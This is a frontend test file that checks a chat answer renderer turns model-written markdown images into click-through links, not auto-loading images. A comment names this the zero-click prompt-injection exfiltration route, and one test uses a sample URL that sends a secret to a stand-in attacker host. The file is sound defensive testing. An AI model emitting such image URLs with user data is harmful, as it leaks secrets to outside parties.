import { render } from '@testing-library/react'
import { describe, expect, it } from 'vitest'

import { AnswerImage } from '../message'

// The answer renderer must NOT emit an auto-loading <img> for model-authored
// markdown images — that is the zero-click prompt-injection exfiltration
// channel. It renders a click-through link instead.
describe('AnswerImage (answer markdown image override)', () => {
  it('renders a link, never an auto-loading <img>, for an external src', () => {
    const { container } = render(
      <AnswerImage src="https://attacker.example/pixel?d=secret" alt="pic" />
    )
    expect(container.querySelector('img')).toBeNull()
    const a = container.querySelector('a')
    expect(a).not.toBeNull()
    expect(a?.getAttribute('href')).toBe(
      'https://attacker.example/pixel?d=secret'
    )
    // noreferrer so a click does not leak the page URL
    expect(a?.getAttribute('rel')).toContain('noreferrer')
  })

  it('shows the alt text as the link label', () => {
    const { getByText } = render(
      <AnswerImage src="https://example.com/x.png" alt="a diagram" />
    )
    expect(getByText('a diagram')).toBeTruthy()
  })

  it('renders plain text (no link) when there is no usable src', () => {
    const { container } = render(<AnswerImage alt="orphan" />)
    expect(container.querySelector('a')).toBeNull()
    expect(container.querySelector('img')).toBeNull()
    expect(container.textContent).toBe('orphan')
  })
})
